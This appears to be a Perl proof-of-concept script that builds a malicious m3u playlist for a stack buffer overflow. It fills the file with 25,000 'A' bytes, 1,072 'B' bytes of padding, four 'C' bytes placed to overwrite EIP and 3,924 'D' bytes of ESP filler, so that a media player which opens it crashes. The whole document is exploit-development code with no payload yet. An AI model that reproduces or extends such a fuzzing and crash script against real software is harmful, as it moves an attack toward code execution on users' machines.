#! /usr/bin/perl

my $file= "crash.m3u";

my $junk= "\x41" x 25000;
my $junk2= "\x42" x 1072;
my $eip= "\x43" x 4;
my $espdata= "\x44" x 3924;

open($FILE,">$file");
print $FILE $junk.$junk2.$eip.$espdata;
close($FILE);
print "m3u File Created successfully\n";
